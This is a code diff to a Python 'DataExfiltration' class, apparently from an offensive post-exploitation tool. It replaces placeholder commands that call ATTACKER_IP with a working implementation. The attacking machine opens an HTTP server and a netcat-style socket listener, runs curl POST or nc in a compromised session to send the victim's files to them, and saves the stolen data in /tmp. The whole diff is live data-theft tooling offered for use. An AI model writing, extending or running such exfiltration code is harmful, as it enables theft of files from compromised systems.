@@ -262,21 +262,129 @@ class DataExfiltration:
                         callback({'message': f'❌ Exfiltration failed: {e}'})
         
         elif method == 'http_post':
-            # Post data to attacker-controlled server
-            # This would require a listener on the attacking machine
-            cmd = f"curl -X POST -d @'{file_path}' http://ATTACKER_IP:8000/upload 2>/dev/null"
+            # Post data to attacker-controlled server - REAL IMPLEMENTATION
+            import socket
+            
+            # Get local IP for exfiltration endpoint
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                s.connect(('8.8.8.8', 80))
+                attacker_ip = s.getsockname()[0]
+            except:
+                attacker_ip = '127.0.0.1'
+            finally:
+                s.close()
+            
+            # Start simple HTTP server to receive data
+            import threading
+            import http.server
+            
+            received_data = {'data': None}
+            
+            class ExfilHandler(http.server.BaseHTTPRequestHandler):
+                def do_POST(self):
+                    content_length = int(self.headers['Content-Length'])
+                    received_data['data'] = self.rfile.read(content_length)
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'OK')
+                
+                def log_message(self, format, *args):
+                    pass  # Suppress logs
+            
+            # Start server in background
+            server = http.server.HTTPServer((attacker_ip, 8000), ExfilHandler)
+            server_thread = threading.Thread(target=server.handle_request)
+            server_thread.daemon = True
+            server_thread.start()
+            
+            # Execute exfiltration command
+            cmd = f"curl -X POST --data-binary @'{file_path}' http://{attacker_ip}:8000/upload 2>/dev/null"
             output = self._execute_in_session(session_id, cmd, callback)
             
-            if callback:
-                callback({'message': f'📡 Data posted to HTTP server'})
+            # Wait for data
+            server_thread.join(timeout=10)
+            server.server_close()
+            
+            if received_data['data']:
+                # Save received data
+                filename = os.path.basename(file_path)
+                save_path = f"/tmp/exfil_http_{session_id}_{filename}"
+                
+                with open(save_path, 'wb') as f:
+                    f.write(received_data['data'])
+                
+                if callback:
+                    callback({'message': f'✅ Data received via HTTP: {len(received_data["data"])} bytes'})
+                
+                return save_path
         
         elif method == 'netcat':
-            # Send via netcat
-            cmd = f"nc ATTACKER_IP 9999 < '{file_path}'"
+            # Send via netcat - REAL IMPLEMENTATION
+            import socket
+            import threading
+            
+            # Get local IP
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                s.connect(('8.8.8.8', 80))
+                attacker_ip = s.getsockname()[0]
+            except:
+                attacker_ip = '127.0.0.1'
+            finally:
+                s.close()
+            
+            received_data = {'data': b''}
+            
+            # Start netcat listener
+            def nc_listener():
+                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                server.bind((attacker_ip, 9999))
+                server.listen(1)
+                server.settimeout(30)
+                
+                try:
+                    conn, addr = server.accept()
+                    while True:
+                        chunk = conn.recv(4096)
+                        if not chunk:
+                            break
+                        received_data['data'] += chunk
+                    conn.close()
+                except:
+                    pass
+                finally:
+                    server.close()
+            
+            # Start listener in background
+            listener_thread = threading.Thread(target=nc_listener)
+            listener_thread.daemon = True
+            listener_thread.start()
+            
+            # Give listener time to start
+            import time
+            time.sleep(1)
+            
+            # Execute netcat send
+            cmd = f"nc {attacker_ip} 9999 < '{file_path}'"
             output = self._execute_in_session(session_id, cmd, callback)
             
-            if callback:
-                callback({'message': f'📡 Data sent via netcat'})
+            # Wait for data
+            listener_thread.join(timeout=30)
+            
+            if received_data['data']:
+                # Save received data
+                filename = os.path.basename(file_path)
+                save_path = f"/tmp/exfil_nc_{session_id}_{filename}"
+                
+                with open(save_path, 'wb') as f:
+                    f.write(received_data['data'])
+                
+                if callback:
+                    callback({'message': f'✅ Data received via netcat: {len(received_data["data"])} bytes'})
+                
+                return save_path
         
         return None
     
